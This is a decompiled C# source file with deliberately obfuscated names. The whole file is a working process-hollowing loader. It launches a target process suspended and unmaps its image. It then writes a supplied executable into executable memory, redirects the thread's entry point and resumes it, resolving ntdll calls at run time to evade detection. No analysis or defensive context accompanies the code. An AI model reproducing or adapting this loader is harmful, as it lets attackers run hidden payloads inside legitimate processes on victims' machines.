using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class9
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate4(IntPtr Parameteriterowhwijtkwhhrtet, uint[] Parameteriterowhwijtkwhhrtet_One);

	public delegate uint Delegate5(IntPtr Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj, IntPtr Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate6(IntPtr Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj, IntPtr Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two, ref IntPtr bufr, int Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two_Two, ref IntPtr Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two_Two_Two);

	public delegate uint Delegate7(IntPtr Parameteriterowhwijtkwhhrtetead, IntPtr Parameternreerrrjprrrkejjpktskjkstunjgreut);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate8(IntPtr Parameteriterowhwijtkwhhrtet, uint[] Parameteriterowhwijtkwhhrtet_One);

	public delegate IntPtr Delegate9(IntPtr Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj, IntPtr Parameterhpwwepppgppegwtpggkoggggkyhpopeykoe, IntPtr Parameterhpwwepppgppegwtpggkoggggkyhpopeykoe_Two, int Parameterhpwwepppgppegwtpggkoggggkyhpopeykoe_Two_Two, int Parameterhpwwepppgppegwtpggkoggggkyhpopeykoe_Two_Two_Two);

	public delegate bool Delegate10(IntPtr Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrjess, IntPtr Parameteregpmggghhgggpwhwojwojwjophehggjhwggo, byte[] Parameteregpmggghhgggpwhwojwojwjophehggjhwggo_Two, uint Parameteregpmggghhgggpwhwojwojwjophehggjhwggo_Two_Two, int Parameteregpmggghhgggpwhwojwojwjophehggjhwggo_Two_Two_Two);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	public static T smethod_0<T>(string string_0, string string_1)
	{
		T val = default(T);
		try
		{
			val = (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
			return val;
		}
		catch (Exception exception_)
		{
			Class11.smethod_24(exception_, string_0, string_1, val);
			throw;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CreateProcessW([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, StringBuilder stringBuilder_0, IntPtr intptr_0, IntPtr intptr_1, [MarshalAs(UnmanagedType.Bool)] bool bool_0, int int_0, IntPtr intptr_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, byte[] byte_0, IntPtr[] intptr_3);

	private static int smethod_1(long long_0, long long_1 = 4L)
	{
		Delegate6 @delegate = default(Delegate6);
		IntPtr Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two_Two_Two = default(IntPtr);
		IntPtr bufr = default(IntPtr);
		int num = default(int);
		int num2 = default(int);
		try
		{
			@delegate = smethod_0<Delegate6>("ntdll", "NtReadVirtualMemory");
			Delegate6 delegate2 = @delegate;
			IntPtr handle = Process.GetCurrentProcess().Handle;
			IntPtr parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two = (IntPtr)long_0;
			int parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two_Two = checked((int)long_1);
			Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two_Two_Two = (IntPtr)0;
			delegate2(handle, parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two, ref bufr, parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two_Two, ref Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two_Two_Two);
			num = (int)Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two_Two_Two;
			num2 = (int)bufr;
			return num2;
		}
		catch (Exception exception_)
		{
			Class11.smethod_28(exception_, long_0, long_1, bufr, num2, @delegate, num, Parameterrrewjrrjrrrjrrjrjerwetejrrrjwrj_Two_Two_Two);
			throw;
		}
	}

	public static bool smethod_2(byte[] byte_0, string string_0)
	{
		checked
		{
			GCHandle gCHandle = default(GCHandle);
			int num = default(int);
			IntPtr zero = default(IntPtr);
			IntPtr[] array = default(IntPtr[]);
			byte[] array2 = default(byte[]);
			int num2 = default(int);
			uint[] array3 = default(uint[]);
			string string_ = default(string);
			string string_2 = default(string);
			int num3 = default(int);
			int num4 = default(int);
			Delegate5 @delegate = default(Delegate5);
			Delegate9 delegate2 = default(Delegate9);
			IntPtr intPtr = default(IntPtr);
			IntPtr intPtr2 = default(IntPtr);
			IntPtr intPtr3 = default(IntPtr);
			Delegate10 delegate3 = default(Delegate10);
			int num5 = default(int);
			int num6 = default(int);
			int num7 = default(int);
			int num9 = default(int);
			int[] array4 = default(int[]);
			byte[] array5 = default(byte[]);
			int num10 = default(int);
			Delegate4 delegate4 = default(Delegate4);
			Delegate8 delegate5 = default(Delegate8);
			Delegate7 delegate6 = default(Delegate7);
			Exception ex2 = default(Exception);
			bool flag = default(bool);
			try
			{
				try
				{
					gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
					num = (int)gCHandle.AddrOfPinnedObject();
					gCHandle.Free();
					zero = IntPtr.Zero;
					array = new IntPtr[4];
					array2 = new byte[68];
					num2 = BitConverter.ToInt32(byte_0, 60);
					array3 = new uint[179];
					array3[0] = 65538u;
					string_ = null;
					StringBuilder stringBuilder_ = new StringBuilder(string_0);
					IntPtr intptr_ = zero;
					IntPtr intptr_2 = zero;
					IntPtr intptr_3 = zero;
					string_2 = null;
					CreateProcessW(ref string_, stringBuilder_, intptr_, intptr_2, bool_0: false, 4, intptr_3, ref string_2, array2, array);
					num3 = num + smethod_1(num + 60);
					num4 = smethod_1(num3 + 52);
					@delegate = smethod_0<Delegate5>("ntdll", "NtUnmapViewOfSection");
					@delegate(array[0], (IntPtr)num4);
					delegate2 = smethod_0<Delegate9>("kernel32", "VirtualAllocEx");
					intPtr = delegate2(array[0], (IntPtr)num4, (IntPtr)smethod_1(num3 + 80), 12288, 64);
					intPtr2 = new IntPtr(BitConverter.ToInt32(byte_0, num2 + 52));
					intPtr3 = new IntPtr(BitConverter.ToInt32(byte_0, num2 + 80));
					delegate3 = smethod_0<Delegate10>("ntdll", "NtWriteVirtualMemory");
					delegate3(array[0], intPtr, byte_0, (uint)smethod_1(num3 + 84), num5);
					num6 = smethod_1(num3 + 6, 2L) - 1;
					num7 = 0;
					while (true)
					{
						int num8 = num7;
						num9 = num6;
						if (num8 > num9)
						{
							break;
						}
						array4 = new int[10];
						Buffer.BlockCopy(byte_0, num2 + 248 + num7 * 40, array4, 0, 40);
						array5 = new byte[array4[4] - 1 + 1];
						Buffer.BlockCopy(byte_0, array4[5], array5, 0, array5.Length);
						intPtr3 = new IntPtr(intPtr.ToInt32() + array4[3]);
						intPtr2 = new IntPtr(array5.Length);
						delegate3(array[0], intPtr3, array5, (uint)(int)intPtr2, num10);
						num7++;
					}
					delegate4 = smethod_0<Delegate4>("ntdll", "NtGetContextThread");
					delegate4(array[1], array3);
					delegate3(array[0], (IntPtr)(unchecked((long)array3[41]) + 8L), BitConverter.GetBytes(intPtr.ToInt32()), 4u, num10);
					array3[44] = (uint)(num4 + smethod_1(num3 + 40));
					delegate5 = smethod_0<Delegate8>("ntdll", "NtSetContextThread");
					delegate5(array[1], array3);
					delegate6 = smethod_0<Delegate7>("ntdll", "NtResumeThread");
					delegate6(array[1], (IntPtr)0);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					ex2 = ex;
					flag = false;
					ProjectData.ClearProjectError();
					return flag;
				}
				flag = true;
				return flag;
			}
			catch (Exception exception_)
			{
				Class11.smethod_32(exception_, new object[31]
				{
					byte_0, string_0, flag, delegate2, intPtr2, delegate6, delegate4, delegate5, delegate3, zero,
					intPtr, num10, intPtr3, array3, num5, gCHandle, num4, num2, num3, @delegate,
					num, array2, array, num7, array4, array5, ex2, string_, string_2, num6,
					num9
				});
				throw;
			}
		}
	}
}
